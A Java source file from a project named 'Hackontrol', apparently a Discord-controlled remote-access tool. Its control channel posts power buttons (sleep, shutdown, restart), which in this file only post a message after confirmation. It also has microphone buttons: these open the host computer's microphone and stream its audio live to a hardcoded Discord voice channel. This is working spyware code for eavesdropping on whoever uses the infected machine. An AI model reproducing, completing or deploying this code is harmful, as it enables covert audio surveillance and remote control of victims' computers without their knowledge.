package com.khopan.hackontrol.channel;

import java.nio.ByteBuffer;

import javax.sound.sampled.AudioInputStream;
import javax.sound.sampled.AudioSystem;
import javax.sound.sampled.DataLine.Info;
import javax.sound.sampled.TargetDataLine;

import com.khopan.hackontrol.Hackontrol;
import com.khopan.hackontrol.HackontrolChannel;
import com.khopan.hackontrol.manager.button.ButtonContext;
import com.khopan.hackontrol.manager.button.ButtonManager;
import com.khopan.hackontrol.manager.button.Question;
import com.khopan.hackontrol.manager.button.Question.OptionType;
import com.khopan.hackontrol.manager.button.Question.QuestionResponse;
import com.khopan.hackontrol.manager.common.sender.sendable.ChannelSendable;
import com.khopan.hackontrol.registry.Registry;
import com.khopan.hackontrol.utils.HackontrolError;

import net.dv8tion.jda.api.audio.AudioSendHandler;
import net.dv8tion.jda.api.entities.Guild;
import net.dv8tion.jda.api.entities.channel.concrete.VoiceChannel;
import net.dv8tion.jda.api.interactions.components.buttons.ButtonStyle;
import net.dv8tion.jda.api.managers.AudioManager;

public class ControlChannel extends HackontrolChannel {
	private static final String CHANNEL_NAME = "control";

	private static final String BUTTON_SLEEP = "controlSleep";
	private static final String BUTTON_SHUTDOWN = "controlShutdown";
	private static final String BUTTON_RESTART = "controlRestart";

	private static final String BUTTON_CONNECT = "controlConnect";
	private static final String BUTTON_DISCONNECT = "controlDisconnect";

	private AudioManager audioManager;
	private SendHandler handler;

	public ControlChannel() {
		Hackontrol hackontrol = Hackontrol.getInstance();
		hackontrol.setErrorHandler(this :: handleError);
	}

	@Override
	public String getName() {
		return ControlChannel.CHANNEL_NAME;
	}

	@Override
	public void initialize() {
		this.channel.sendMessage("**Power Control**").addActionRow(
				ButtonManager.staticButton(ButtonStyle.SUCCESS, "Sleep", ControlChannel.BUTTON_SLEEP),
				ButtonManager.staticButton(ButtonStyle.DANGER, "Shutdown", ControlChannel.BUTTON_SHUTDOWN),
				ButtonManager.staticButton(ButtonStyle.PRIMARY, "Restart", ControlChannel.BUTTON_RESTART)
				).queue();

		this.channel.sendMessage("**Microphone Control**").addActionRow(
				ButtonManager.staticButton(ButtonStyle.SUCCESS, "Connect", ControlChannel.BUTTON_CONNECT),
				ButtonManager.staticButton(ButtonStyle.DANGER, "Disconnect", ControlChannel.BUTTON_DISCONNECT)
				).queue();
	}

	@Override
	public void register(Registry registry) {
		registry.register(ButtonManager.STATIC_BUTTON_REGISTRY, ControlChannel.BUTTON_SLEEP, context -> this.power(context, PowerAction.SLEEP));
		registry.register(ButtonManager.STATIC_BUTTON_REGISTRY, ControlChannel.BUTTON_SHUTDOWN, context -> this.power(context, PowerAction.SHUTDOWN));
		registry.register(ButtonManager.STATIC_BUTTON_REGISTRY, ControlChannel.BUTTON_RESTART, context -> this.power(context, PowerAction.RESTART));
		registry.register(ButtonManager.STATIC_BUTTON_REGISTRY, ControlChannel.BUTTON_CONNECT, context -> this.connect(context, true));
		registry.register(ButtonManager.STATIC_BUTTON_REGISTRY, ControlChannel.BUTTON_DISCONNECT, context -> this.connect(context, false));
	}

	private void power(ButtonContext context, PowerAction powerAction) {
		Question.create(context.reply(), "Are you sure you want to " + powerAction.text + '?', OptionType.YES_NO, result -> {
			if(QuestionResponse.POSITIVE_RESPONSE.equals(result)) {
				context.sendMessage(powerAction.text).queue();
			}
		});
	}

	private void connect(ButtonContext context, boolean connect) {
		if(connect) {
			context.acknowledge();
			this.connectCallback(context, true);
			return;
		}

		if(this.handler == null) {
			HackontrolError.message(context.reply(), "Hackontrol is already disconnected");
			return;
		}

		Question.create(context.reply(), "Are you sure you want to disconnect?", OptionType.YES_NO, result -> {
			if(QuestionResponse.POSITIVE_RESPONSE.equals(result)) {
				this.connectCallback(context, false);
			}
		});
	}

	private void connectCallback(ButtonContext context, boolean connect) {
		try {
			if(connect) {
				this.connect(context);
			} else {
				this.disconnect(context);
			}
		} catch(Throwable Errors) {
			HackontrolError.throwable(context.message(), Errors);
		}
	}

	private void connect(ButtonContext context) throws Throwable {
		Guild guild = context.getGuild();

		if(this.audioManager == null) {
			this.audioManager = guild.getAudioManager();
		}

		VoiceChannel channel = guild.getVoiceChannelById(1230856739793145919L);

		if(this.handler != null) {
			this.handler.close();
			this.audioManager.closeAudioConnection();
		}

		this.handler = new SendHandler();
		this.audioManager.setSendingHandler(this.handler);
		this.audioManager.setSelfDeafened(true);
		this.audioManager.openAudioConnection(channel);
	}

	private void disconnect(ButtonContext context) throws Throwable {
		Guild guild = context.getGuild();

		if(this.audioManager == null) {
			this.audioManager = guild.getAudioManager();
		}

		this.audioManager.closeAudioConnection();

		if(this.handler == null) {
			return;
		}

		this.handler.close();
		this.handler = null;
	}

	private void handleError(Thread thread, Throwable Errors) {
		HackontrolError.throwable(ChannelSendable.of(this.channel), Errors);
	}

	private static enum PowerAction {
		SLEEP("sleep"),
		SHUTDOWN("shutdown"),
		RESTART("restart");

		private final String text;

		PowerAction(String text) {
			this.text = text;
		}
	}

	private static class SendHandler implements AudioSendHandler {
		private final TargetDataLine line;
		private final AudioInputStream stream;
		private final int size;

		private volatile boolean open;

		private SendHandler() throws Throwable {
			Info info = new Info(TargetDataLine.class, AudioSendHandler.INPUT_FORMAT);
			this.line = (TargetDataLine) AudioSystem.getLine(info);
			this.line.open();
			this.line.start();
			this.stream = new AudioInputStream(this.line);
			this.size = Math.round(AudioSendHandler.INPUT_FORMAT.getSampleRate() * 0.02f * ((float) AudioSendHandler.INPUT_FORMAT.getChannels()) * ((float) AudioSendHandler.INPUT_FORMAT.getSampleSizeInBits()) * 0.125f);
			this.open = true;
		}

		@Override
		public boolean canProvide() {
			return this.open;
		}

		@Override
		public ByteBuffer provide20MsAudio() {
			try {
				return ByteBuffer.wrap(this.stream.readNBytes(this.size));
			} catch(Throwable Errors) {
				return ByteBuffer.allocate(0);
			}
		}

		private void close() throws Throwable {
			this.open = false;
			this.line.stop();
			this.line.close();
			this.stream.close();
		}
	}
}
